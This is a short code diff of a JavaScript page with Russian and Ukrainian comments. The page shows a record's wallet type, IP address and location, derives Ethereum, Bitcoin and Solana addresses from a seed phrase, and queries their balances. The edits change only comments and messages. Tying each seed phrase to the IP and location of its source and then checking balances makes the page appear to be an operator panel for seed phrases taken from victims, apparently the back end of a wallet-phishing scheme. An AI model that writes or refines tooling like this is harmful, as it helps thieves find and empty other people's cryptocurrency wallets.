@@ -33,7 +33,7 @@
         const walletType = (data.wallet || "").toLowerCase();
         const timestamp = data.timestamp || "–";
         const ip = data.ip || "–";
-        const userLocation = data.location || "–";
+        const userLocation = data.location || "–";  // <-- змінено з "location"
 
         document.getElementById("timestamp").textContent = timestamp;
         document.getElementById("userIp").textContent = ip;
@@ -54,22 +54,25 @@
 
         async function deriveAddresses(seedPhrase) {
             try {
+                // ETH
                 const ethWallet = ethers.Wallet.fromMnemonic(seedPhrase);
                 addresses.eth = ethWallet.address;
                 document.getElementById("ethAddress").textContent = addresses.eth;
 
+                // BTC
                 const seed = await bip39.mnemonicToSeed(seedPhrase);
                 const root = bitcoin.bip32.fromSeed(seed);
                 const child = root.derivePath("m/44'/0'/0'/0/0");
                 addresses.btc = bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
                 document.getElementById("btcAddress").textContent = addresses.btc;
 
+                // SOL
                 const solKey = seed.slice(0, 32);
                 const solPair = solanaWeb3.Keypair.fromSeed(solKey);
                 addresses.sol = solPair.publicKey.toBase58();
                 document.getElementById("solAddress").textContent = addresses.sol;
             } catch (err) {
-                console.error("❌ Ошибка при генерации адресов:", err);
+                console.error("❌ Ошибка генерации адресов:", err);
             }
         }
 
@@ -79,7 +82,7 @@
                 const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=eth`);
                 return await res.json();
             } catch (e) {
-                console.warn("❌ Не удалось получить цены:", e);
+                console.warn("❌ Ошибка загрузки цен:", e);
                 return {};
             }
         }
@@ -104,8 +107,8 @@
                                 jsonrpc: "2.0",
                                 id: 1,
                                 method: "getBalance",
-                                params: [address],
-                            }),
+                                params: [address]
+                            })
                         });
                         const solData = await solRes.json();
                         return parseFloat(solData.result?.value || 0) / 1e9;
@@ -113,7 +116,7 @@
                         return 0;
                 }
             } catch (e) {
-                console.warn(`⚠️ Ошибка получения баланса ${chain}:`, e.message);
+                console.warn(`⚠️ Ошибка баланса ${chain}:`, e.message);
                 return 0;
             }
         }
